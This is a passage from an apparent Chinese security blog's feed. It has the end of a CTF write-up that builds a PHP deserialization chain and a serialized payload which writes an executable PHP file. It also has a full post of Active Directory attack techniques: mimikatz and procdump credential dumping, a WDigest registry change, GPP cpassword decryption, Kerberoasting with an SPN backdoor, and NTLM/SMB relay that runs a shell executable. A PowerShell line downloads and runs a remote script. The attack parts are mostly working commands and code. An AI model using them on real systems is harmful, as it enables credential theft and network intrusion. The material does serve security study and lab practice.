class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">shortForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>&lt;a href='song.php?name="</span> <span class="token punctuation">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>song<span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/a>&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">name_is</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>继续找，当实例化对象Lyricsde时，log方法存在$this-&gt;logwriter-&gt;writeLog，而writeLog又存在于LogWriter_File类中，这好这个类是我们的漏洞触发点，所以$this-&gt;logwriter应该为new LogWriter_Fil()，构造下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Logger</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logwriter</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LogWriter_File</span><span class="token punctuation">(</span><span class="token string">'123.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>实例化对象Logger之后，调用了LogWriter_File的writeLog方法，而写入文件的txt是通过$this-&gt;format-&gt;format获得，而format方法存在类LogFileFormat中，所以，构造如下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">LogWriter_File</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LogFileFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 111</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//TODO: Modify the address here, and delete this TODO.</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"D:\\phpStudy\\WWW\\ctf"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>在类LogFileFormat中的format方法中利用$filter-&gt;filter来获取的$txt，而$filter是通过foreach获取的，所以$this-&gt;filters为一个数组，最终OutputFilter传入写入文件的内容，就可以构造如下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">OutputFilter</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$matchPattern</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$replacement</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span> <span class="token operator">=</span> '<span class="token comment" spellcheck="true">//';</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span> <span class="token operator">=</span> <span class="token string">'&lt;?= `whoami`?>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogFileFormat</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OutputFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 111</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$filter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>最后，将payload组合起来，利用serialize输出下序列化的结果</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/4.png" alt="4" loading="lazy"></p><pre><code>O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A3%3A%22111%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A7%3A%22123.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A14%3A%22%3C%3F%3D+%60whoami%60%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D</code></pre><p>在base64下通过cookie传入就可以写入ctf123.php了</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/5.png" alt="5" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/</a></p><p>2.<a href="https://xz.aliyun.com/t/3674#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-9</a></p><p>3.<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80" target="_blank" rel="noopener">https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;序列化与反序列化&quot;&gt;&lt;a href=&quot;#序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化&quot;&gt;&lt;/a&gt;&lt;strong&gt;序列化与反序列化&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在php中，使用serialize和unserialize
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>获取域控的方法</title>
    <link href="http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2020-02-26T10:35:58.000Z</published>
    <updated>2020-02-26T10:48:00.083Z</updated>
    
    <content type="html"><![CDATA[<h4 id="高权限读取本地密码"><a href="#高权限读取本地密码" class="headerlink" title="高权限读取本地密码"></a><strong>高权限读取本地密码</strong></h4><p>当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的lsass.exe，可以通过mimikatz来读取到本地的明文密码。</p><pre><code>privilege::debug  # 提权sekurlsa::logonpasswords</code></pre><p>如果主机存在杀软的时候，上传mimikatz很多时候都会被杀掉，可以通过<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">procdump</a>+mimikatz的方式进行绕过。先导出lsass.exe</p><pre><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p>保存到本地，通过mimikatz读lsass.dmp的明文</p><pre><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;  &gt; 1.txt</code></pre><p>如果目标机器是windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录及可以读取明文。</p><p>添加注册表，设置UseLogonCredential设置为1</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p>利用powershell脚本进行锁屏</p><pre><code>Function Lock-WorkStation {$signature = @&quot;[DllImport(&quot;user32.dll&quot;, SetLastError = true)]public static extern bool LockWorkStation();&quot;@$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru$LockWorkStation::LockWorkStation() | Out-Null}Lock-WorkStation</code></pre><p>管理员重新登录后就可以抓取到明文密码了。</p><h4 id="SYSVOL还原组策略"><a href="#SYSVOL还原组策略" class="headerlink" title="SYSVOL还原组策略"></a><strong>SYSVOL还原组策略</strong></h4><p>在域环境中，有个默认的共享路径</p><pre><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></pre><p>SYSVOL是活动目录存储文件服务副本的共享文件夹，里面包含有登录脚本，组策略数据等，域里的所有用户都能访问这个共享文件。在SYSVOL目录下，默认是没有groups.xml文件的，必须创建组策略脚本登录才有这个文件。在groups.xml文件中，密码是通过AES-256加密的，但是微软发布了AES的<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" rel="noopener">私钥</a>。</p><p>可以利用powershell解密密文:</p><pre class=" language-powershell"><code class="language-powershell"><span class="token keyword">function</span> Get<span class="token operator">-</span>DecryptedCpassword <span class="token punctuation">{</span>    <span class="token namespace">[CmdletBinding()]</span>    <span class="token keyword">Param</span> <span class="token punctuation">(</span>        <span class="token namespace">[string]</span> <span class="token variable">$Cpassword</span>    <span class="token punctuation">)</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">#Append appropriate padding based on string length  </span>        <span class="token variable">$Mod</span> = <span class="token punctuation">(</span><span class="token variable">$Cpassword</span><span class="token punctuation">.</span>length <span class="token operator">%</span> 4<span class="token punctuation">)</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$Mod</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token string">'1'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> = <span class="token variable">$Cpassword</span><span class="token punctuation">.</span>Substring<span class="token punctuation">(</span>0<span class="token punctuation">,</span><span class="token variable">$Cpassword</span><span class="token punctuation">.</span>Length <span class="token operator">-</span>1<span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token string">'2'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span>4 <span class="token operator">-</span> <span class="token variable">$Mod</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token string">'3'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span>4 <span class="token operator">-</span> <span class="token variable">$Mod</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$Base64Decoded</span> = <span class="token namespace">[Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$Cpassword</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#Create a new AES .NET Crypto Object</span>        <span class="token variable">$AesObject</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Security<span class="token punctuation">.</span>Cryptography<span class="token punctuation">.</span>AesCryptoServiceProvider        <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span> <span class="token variable">$AesKey</span> = @<span class="token punctuation">(</span>0x4e<span class="token punctuation">,</span>0x99<span class="token punctuation">,</span>0x06<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>0xfc<span class="token punctuation">,</span>0xb6<span class="token punctuation">,</span>0x6c<span class="token punctuation">,</span>0xc9<span class="token punctuation">,</span>0xfa<span class="token punctuation">,</span>0xf4<span class="token punctuation">,</span>0x93<span class="token punctuation">,</span>0x10<span class="token punctuation">,</span>0x62<span class="token punctuation">,</span>0x0f<span class="token punctuation">,</span>0xfe<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>                             0xf4<span class="token punctuation">,</span>0x96<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>0x06<span class="token punctuation">,</span>0xcc<span class="token punctuation">,</span>0x05<span class="token punctuation">,</span>0x79<span class="token punctuation">,</span>0x90<span class="token punctuation">,</span>0x20<span class="token punctuation">,</span>0x9b<span class="token punctuation">,</span>0x09<span class="token punctuation">,</span>0xa4<span class="token punctuation">,</span>0x33<span class="token punctuation">,</span>0xb6<span class="token punctuation">,</span>0x6c<span class="token punctuation">,</span>0x1b<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#Set IV to all nulls to prevent dynamic generation of IV value</span>        <span class="token variable">$AesIV</span> = <span class="token function">New-Object</span> Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$AesObject</span><span class="token punctuation">.</span>IV<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>         <span class="token variable">$AesObject</span><span class="token punctuation">.</span>IV = <span class="token variable">$AesIV</span>        <span class="token variable">$AesObject</span><span class="token punctuation">.</span>Key = <span class="token variable">$AesKey</span>        <span class="token variable">$DecryptorObject</span> = <span class="token variable">$AesObject</span><span class="token punctuation">.</span>CreateDecryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span> <span class="token variable">$OutBlock</span> = <span class="token variable">$DecryptorObject</span><span class="token punctuation">.</span>TransformFinalBlock<span class="token punctuation">(</span><span class="token variable">$Base64Decoded</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$Base64Decoded</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token namespace">[System.Text.UnicodeEncoding]</span>::Unicode<span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$OutBlock</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">catch</span> <span class="token punctuation">{</span><span class="token function">Write-Error</span> <span class="token variable">$Error</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>Get<span class="token operator">-</span>DecryptedCpassword <span class="token string">"I0vK3Yj0SeoHQDxF5skcjt3BOkMZmX6IiqRVKCTo4Z4"</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/1.png" alt="" loading="lazy"></p><p>针对SYSOVL的防御：</p><pre><code>1.打补丁KB29624862.删除SYSVOL目录下的groups.xml3.设置共享文件SYSVOL的权限</code></pre><h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a><strong>Kerberoasting</strong></h4><p>SPN为服务主体名称，是服务实列(MSSQL,HTTP等)的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的SPN，如果kerberos服务票证的加密类型为RC4_HMAC_MD5，就可以导出TGS对其进行离线破解，获取到域用户的密码了。</p><p>使用setspn查询spn(windows7和server2008默认自带)</p><p>查询域内所有的SPN和查询test域的SPN</p><pre><code>setspn.exe -q */*setspn.exe -T test.com -q */*</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/2.png" alt="" loading="lazy"></p><p>以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users</p><p>查询域内注册的spn（kerberoast）</p><pre><code>cscript GetUserSPNs.vbs</code></pre><p>PowerView</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><pre><code>Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon</code></pre><p>给MSSQL服务注册SPN</p><pre><code>setspn.exe -A MSSQLSvc/WIN-M34UCFJIPNQ.test.com test.com\fanxing</code></pre><p>将kerberos的加密方式换成RC4_HMAC_MD5</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/3.png" alt="" loading="lazy"></p><p>请求指定的TGS，完成之后klist就能查看相应的票据</p><pre><code>$SPNName = &#39;MSSQLSvc/WIN-M34UCFJIPNQ.test.com&#39;Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/4.png" alt="" loading="lazy"></p><p>mimikatz导出票据</p><pre><code>kerberos::list /export</code></pre><p>使用<a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">tgsrepcrack.py</a>破解</p><pre><code>python tgsrepcrack.py wordlist.txt mssql.kirbi</code></pre><p><strong>kerberoasting后门利用</strong></p><p>在获取到spn的修改权限后，可以给指定的域用户注册spn，可以获取到任意域用户的TGS进行离线破解</p><pre><code>setspn.exe -U -A VNC/WIN-M34UCFJIPNQ.test.com Administrator</code></pre><h4 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a><strong>重放攻击</strong></h4><p>在NTML认证的过程中，数据包传递的是NTML-Hash加密的16位的challenge随机数得到的Net-NTML</p><p> Hash，如果存在中间人的情况，就可以通过hash进行重放攻击，下面简述下存在中间人，NTML协议过程：</p><p><img src="https://p1.ssl.qhimg.com/t01f22f78b71df16680.png" alt="" loading="lazy"></p><pre><code>1.当客户端对服务端发起请求，客户端并不知道中间人存在，所以把请求发送给了中间人。中间人拿着这个请求发送给服务端，服务端以为是客户端发来的请求。2.进过验证后，会生成一个随机数(challenge)返回给攻击者，服务端保存的ntmlhash进行DES加密challenge(challenge1)，攻击者拿着这个challenge明文发送给客户端。3.客户端对这个challenge用自己的密码进行DES加密(response)，发送给中间人，中间人在将这个请求发送给服务端。4.服务端拿到这个response跟之前加密的challenge1进行对比，一样的话就验证成功。</code></pre><p>在进行ntml中间人攻击的时候，要避免最小的网络流量，所以使用的比较多的也是LLMNR/NetNS欺骗。</p><p>在两台windows进行进行资源请求的时候，对机器的解析顺序为：</p><pre><code>1.HOSTS文件(c:/windows/system32/driver/etc/hosts)2.本地的DNS缓存(ipconfig /displaydns)3.dns服务器4.LLMNR5.NetBios-NS</code></pre><h5 id="SMB中继"><a href="#SMB中继" class="headerlink" title="SMB中继"></a>SMB中继</h5><p>对于smb中继的利用条件：</p><pre><code>1.不能开启smb签名，而在域内，域控上面是开启了签名的，域成员机器是没有开启的。2.打了ms08-068补丁的xp/2003系统也无法利用</code></pre><p>首先利用nmap探测是否开启了签名</p><pre><code>nmap -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.50.241</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/5.png" alt="" loading="lazy"></p><h5 id="Responder-ntmlrelayx"><a href="#Responder-ntmlrelayx" class="headerlink" title="Responder+ntmlrelayx"></a>Responder+ntmlrelayx</h5><p>获取ntmlv2 hash，在攻击机执行</p><pre><code>python Responder.py -I eth0 -v      #假设ip为192.168.50.64</code></pre><p>在任意机器上执行</p><pre><code>dir \\192.168.50.64\c$</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/6.png" alt="" loading="lazy"></p><p>当使用ntmlrelayx进行重放攻击的时候，需要在Responder.conf设置SMB和HTTP服务为Off</p><pre><code>python Responder.py -I eth0 -v    # 启动Responder，假设ip为192.168.50.64python ntlmrelayx.py -t 192.168.50.241   # -t为受害者，进行中继攻击net use192.168.50.64\c$ &quot;fx@123.com&quot; /user:&quot;administrator&quot;   # 攻击机执行</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/7.png" alt="" loading="lazy"></p><h5 id="smbrelayx"><a href="#smbrelayx" class="headerlink" title="smbrelayx"></a>smbrelayx</h5><p>使用smbrelayx和ntmlrelayx都是利用的<a href="https://github.com/CoreSecurity/impacket.git" target="_blank" rel="noopener">impacket</a>，环境配置</p><pre><code>pip install pycrypto    # 安装加密库apt-get --reinstall install python-pyasn1 python-pyasn1-modulescd impacket/python setup.py install</code></pre><p>在攻击机进行重放攻击</p><pre><code># -h为指定受害者，-e在进行重放攻击后，在受害者机器执行exepython smbrelayx.py -h 192.168.50.241 -e /root/shell.exe </code></pre><p>在内网其他目标机器执行</p><pre><code>net use192.168.50.64\c$ &quot;fx@123.com&quot; /user:&quot;administrator&quot;</code></pre><p>在msf上成功获取到meterpreter</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/8.png" alt="" loading="lazy"></p><h5 id="Windows平台的重放攻击"><a href="#Windows平台的重放攻击" class="headerlink" title="Windows平台的重放攻击"></a>Windows平台的重放攻击</h5><p>在windows下，可以利用powershell编写的<a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">Inveigh</a>工具</p><pre><code>powershell &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1&#39;);Invoke-Inveigh -consoleoutput Y FileOutput Y&quot;</code></pre><p>在其他主机上执行</p><pre><code>dir \\192.168.50.242\c$   或者在开启HTTP，利用&lt;img&gt;来加载图片&lt;img src=&quot;\\192.168.50.242\1.png&quot;&gt;    在通过HTTP协议访问就行了</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E5%9F%9F%E5%9B%BE%E7%89%87/9.png" alt="" loading="lazy"></p><p>注意：在获取权限的那台机器，需要关闭windows防火墙，不是一直获取到challenge。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;高权限读取本地密码&quot;&gt;&lt;a href=&quot;#高权限读取本地密码&quot; class=&quot;headerlink&quot; title=&quot;高权限读取本地密码&quot;&gt;&lt;/a&gt;&lt;strong&gt;高权限读取本地密码&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;当域管理员在域成员机器上登录进行工作的时候，会将明
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP3.2.3 漏洞分析</title>
    <link href="http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-02-23T16:00:00.000Z</published>
    <updated>2020-04-29T05:17:44.842Z</updated>
    
